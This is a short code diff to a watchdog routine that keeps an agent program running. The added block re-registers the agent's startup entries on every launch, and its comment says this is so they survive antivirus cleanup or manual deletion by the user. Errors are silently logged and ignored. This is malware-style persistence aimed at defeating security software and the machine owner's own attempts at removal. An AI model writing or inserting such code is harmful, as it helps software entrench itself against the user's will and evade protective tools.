@@ -78,6 +78,14 @@ def watchdog_main():
     exe_dir = _get_exe_dir()
     agent_path = os.path.join(exe_dir, AGENT_EXE_NAME)
 
+    # Re-register startup entries on every watchdog launch so they survive
+    # antivirus cleanup or manual deletion.
+    try:
+        from startup import add_to_startup
+        add_to_startup(agent_path)
+    except Exception as e:
+        log.debug("Watchdog: startup re-register failed: %s", e)
+
     while True:
         try:
             if not _is_process_running(AGENT_EXE_NAME):
